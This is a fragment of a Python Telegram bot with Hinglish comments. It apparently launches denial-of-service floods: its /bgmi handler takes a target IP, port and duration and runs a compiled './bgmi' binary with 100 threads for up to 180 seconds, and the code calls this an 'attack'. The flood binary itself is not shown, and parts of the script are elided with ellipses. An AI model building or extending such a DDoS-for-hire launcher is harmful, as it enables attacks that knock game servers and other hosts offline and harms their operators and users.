...
# Threads ko 500 se 100 kiya hai taaki timeout na ho
thread_count = 100 
...
def bgmi_command(message):
    ...
    try:
        ...
        if duration > 180: # Time limit for stability
        ...
        def run_attack():
            ...
            try:
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "❌ *Error:* Binary not compiled/found!")
                    return
                
                # Command configuration matching bgmi.c arguments
                # ./bgmi ip port time threads
                cmd = ["./bgmi", ip, str(port), str(duration), str(thread_count)]
                
                # subprocess.Popen use kiya hai taaki Python script freeze na ho
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Attack duration tak wait karein
                time.sleep(duration)
                process.terminate()
